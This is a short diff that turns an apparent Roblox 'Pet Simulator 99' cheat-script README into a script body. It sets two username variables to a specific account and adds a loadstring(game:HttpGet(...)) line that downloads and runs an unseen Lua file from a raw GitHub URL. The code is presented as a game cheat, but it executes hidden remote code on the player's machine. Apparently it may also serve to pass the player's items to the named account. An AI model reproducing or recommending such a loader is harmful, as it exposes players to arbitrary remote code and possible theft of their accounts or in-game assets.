@@ -1,2 +1,4 @@
-# Petsim99-script-easter-updt
-antiban/Huge hunter/Auto mine/Auto tap
+Username = 'RubinTheTanod' 
+Username2 = 'RubinTheTanod'
+
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
